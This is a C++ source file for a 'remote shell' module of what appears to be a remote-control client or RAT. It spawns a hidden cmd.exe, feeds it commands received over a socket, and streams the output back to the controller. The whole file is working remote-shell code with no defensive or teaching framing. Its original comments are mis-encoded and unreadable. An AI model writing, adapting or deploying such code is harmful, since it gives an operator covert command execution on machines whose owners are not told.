#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {
	// �ֶ������ź�
	m_hRecvPacketShellRemoteCloseEvent = CreateEvent(NULL, true, false, NULL);
	m_hSendPacketShellRemoteConnectEvent = CreateEvent(NULL, true, false, NULL);

	// ִ��shell�Ļ�����
	InitializeCriticalSection(&m_ExecuteCs);

	m_hRead = NULL;
	m_hWrite = NULL;

	m_hJob = NULL;
}


CModuleShellRemote::~CModuleShellRemote() {
	// ��ֹ��ҵ���Զ���ֹCMD.exe���̼����ӽ���(��ping -t xxx.com�ӽ���)��
	if (m_hJob != NULL) {
		TerminateJobObject(m_hJob, 0);
		CloseHandle(m_hJob);
		m_hJob = NULL;
	}

	if (m_hRecvPacketShellRemoteCloseEvent != NULL) {
		CloseHandle(m_hRecvPacketShellRemoteCloseEvent);
		m_hRecvPacketShellRemoteCloseEvent = NULL;
	}
	if (m_hSendPacketShellRemoteConnectEvent != NULL) {
		CloseHandle(m_hSendPacketShellRemoteConnectEvent);
		m_hSendPacketShellRemoteConnectEvent = NULL;
	}

	DeleteCriticalSection(&m_ExecuteCs);

	// CloseHandle��RunCmdProcessThreadFunc�н���
	m_hRead = NULL;
	m_hWrite = NULL;
}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);					// �ǵ����̺߳�������delete�����

	switch (pPacketCopy->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: {
		SHELL_REMOTE_EXECUTE_THREAD_PARAM* pThreadParam = new SHELL_REMOTE_EXECUTE_THREAD_PARAM(this, pPacketCopy);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OnRecvPacketShellRemoteExecute, (LPVOID)pThreadParam, 0, NULL);
		break;
	}
		
	case SHELL_EXECUTE_RESULT:
		break;

	case SHELL_EXECUTE_RESULT_OVER:
		break;

	case SHELL_CLOSE:
		SetEvent(m_hRecvPacketShellRemoteCloseEvent);
		m_pChildSocketClient->SendPacket(SHELL_CLOSE, NULL, 0);
		break;
	}
}



VOID CModuleShellRemote::RunCmdProcess() {
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)this->RunCmdProcessThreadFunc, this, 0, NULL);
}


DWORD WINAPI CModuleShellRemote::RunCmdProcessThreadFunc(LPVOID lParam)
{
	CModuleShellRemote* pThis = (CModuleShellRemote*)lParam;

	STARTUPINFO					si;
	PROCESS_INFORMATION			pi;
	SECURITY_ATTRIBUTES			sa;

	HANDLE						hRead = NULL;
	HANDLE						hWrite = NULL;
	HANDLE						hRead2 = NULL;
	HANDLE						hWrite2 = NULL;

	WCHAR						pszSystemPath[MAX_PATH] = { 0 };
	WCHAR						pszCommandPath[MAX_PATH] = { 0 };

	
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//���������ܵ�
	if (!CreatePipe(&hRead, &hWrite2, &sa, 0)) {
		goto Clean;
	}
	if (!CreatePipe(&hRead2, &hWrite, &sa, 0)) {
		goto Clean;
	}

	pThis->m_hRead = hRead;
	pThis->m_hWrite = hWrite;

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdInput = hRead2;
	si.hStdError = hWrite2;
	si.hStdOutput = hWrite2;	
	si.wShowWindow  =SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// ��ȡϵͳĿ¼
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
	// ƴ�ӳ�����cmd.exe������
	StringCbPrintf(pszCommandPath, MAX_PATH, L"%s\\cmd.exe", pszSystemPath);

	// ������ҵ
	// һ��ʼû����ҵ�����ֻ����ֹcmd���̣����������ӽ��̣�����ping -t xxx.com��û����ֹ��ɱ�������̣��ӽ����Ի����У����Ը�����ҵ
	pThis->m_hJob = CreateJobObject(NULL, NULL);

	// ����CMD����
	if (!CreateProcess(pszCommandPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		DebugPrint("error = 0x%x\n", GetLastError());
		goto Clean;
	}

	// ��cmd������ӵ���ҵ��
	AssignProcessToJobObject(pThis->m_hJob, pi.hProcess);

	// �����ý��̺�������ض˷���CONNECT��Ӧ����
	pThis->m_pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
	SetEvent(pThis->m_hSendPacketShellRemoteConnectEvent);

	// �ȴ��ر�
	WaitForSingleObject(pThis->m_pChildSocketClient->m_hChildSocketClientExitEvent, INFINITE);

Clean:
	//�ͷž��
	if (hRead != NULL) {
		CloseHandle(hRead);
		hRead = NULL;
		pThis->m_hRead = NULL;
	}
	if (hRead2 != NULL) {
		CloseHandle(hRead2);
		hRead2 = NULL;
	}
	if (hWrite != NULL) {
		CloseHandle(hWrite);
		hWrite = NULL;
		pThis->m_hWrite = NULL;
	}
	if (hWrite2 != NULL) {
		CloseHandle(hWrite2);
		hWrite2 = NULL;
	}
	return 0;
}


// ������ֻ��Ҫִ�е�����д��CMD���̵Ļ�������ִ�н������һ�̸߳���ѭ����ȡ������
VOID WINAPI CModuleShellRemote::OnRecvPacketShellRemoteExecute(LPVOID lParam) {
	SHELL_REMOTE_EXECUTE_THREAD_PARAM* pThreadParam = (SHELL_REMOTE_EXECUTE_THREAD_PARAM*)lParam;
	CModuleShellRemote* pThis = pThreadParam->m_pThis;
	CPacket* pPacket = pThreadParam->m_pPacket;
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	delete pThreadParam;

	CHAR pszCommand[SHELL_MAX_LENGTH];
	DWORD dwBytesWritten = 0;

	EnterCriticalSection(&pThis->m_ExecuteCs);

	WideCharToMultiByte(CP_ACP, 0, (PWSTR)pPacket->m_pbPacketBody, -1, pszCommand, SHELL_MAX_LENGTH, NULL, NULL);
	strcat_s(pszCommand, "\r\n");
	if (pThis->m_hWrite != NULL) {
		WriteFile(pThis->m_hWrite, pszCommand, strlen(pszCommand), &dwBytesWritten, NULL);
	}

	LeaveCriticalSection(&pThis->m_ExecuteCs);

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}
}


VOID CModuleShellRemote::LoopReadAndSendCommandReuslt() {
	BYTE SendBuf[SEND_BUFFER_MAX_LENGTH];
	DWORD dwBytesRead = 0;
	DWORD dwTotalBytesAvail = 0;

	while (m_hRead != NULL)
	{
		// �����ر��¼�ʱ����ѭ���������̡߳�
		if (WAIT_OBJECT_0 == WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
			break;
		}

		while (true) {
			// ��ReadFile���ƣ������������ɾ���Ѷ�ȡ�Ļ��������ݣ����ҹܵ���û������ʱ�����������ء�
			// ���ڹܵ���û������ʱ��ReadFile������������������PeekNamedPipe���жϹܵ��������ݣ�����������
			PeekNamedPipe(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, &dwTotalBytesAvail, NULL);
			if (dwBytesRead == 0) {
				break;
			}
			dwBytesRead = 0;
			dwTotalBytesAvail = 0;

			// �ҵ�������ȡһ�����н�������һ���Ѷ�ȡ�Ļ�����������PeekNamedPipe�������жϹܵ��Ƿ�Ϊ�գ�ȡ���ݻ�����ReadFile
			BOOL bReadSuccess = ReadFile(m_hRead, SendBuf, sizeof(SendBuf), &dwBytesRead, NULL);

			// TODO ����û��
			if (WAIT_OBJECT_0 != WaitForSingleObject(m_pChildSocketClient->m_hChildSocketClientExitEvent, 0)) {
				m_pChildSocketClient->SendPacket(SHELL_EXECUTE_RESULT, (PBYTE)SendBuf, dwBytesRead);
			}

			memset(SendBuf, 0, sizeof(SendBuf));
			dwBytesRead = 0;
			Sleep(100);
		}
	}
}